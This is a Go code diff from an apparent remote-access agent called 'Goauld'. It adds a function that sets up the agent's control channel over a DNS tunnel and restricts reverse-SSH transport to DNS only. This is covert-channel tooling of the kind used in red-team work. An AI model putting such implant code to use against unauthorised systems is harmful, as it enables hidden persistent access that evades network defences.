@@ -4,6 +4,7 @@ import (
 	"Goauld/agent/config"
 	globalcontext "Goauld/agent/context"
 	"Goauld/agent/control"
+	"Goauld/agent/ssh/transport"
 	"Goauld/common/log"
 	"context"
 	"os"
@@ -138,4 +139,26 @@ func KillSwitchLoop(days int, globalCanceler *globalcontext.GlobalCanceler) time
 	}()
 
 	return d
+}
+
+func ClosureInitControlOverDNS(dnsTransport *transport.DNSSH) func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
+	return func(client *control.ControlPlanClient, success chan<- struct{}, chanErr chan<- error) error {
+		if !dnsTransport.Started {
+			err := dnsTransport.Start()
+			if err != nil {
+				return err
+			}
+		}
+
+		err := client.InitOverDNS(dnsTransport.ControlStream, success, chanErr)
+		if err != nil {
+			return err
+		}
+
+		// As the  control socket is established using DNS we consider that the only working protocol is DNS
+		// so we set the RSSH protocol order to only DNS
+		config.Get().SetRSSHOrder([]string{"DNS"})
+
+		return nil
+	}
 }
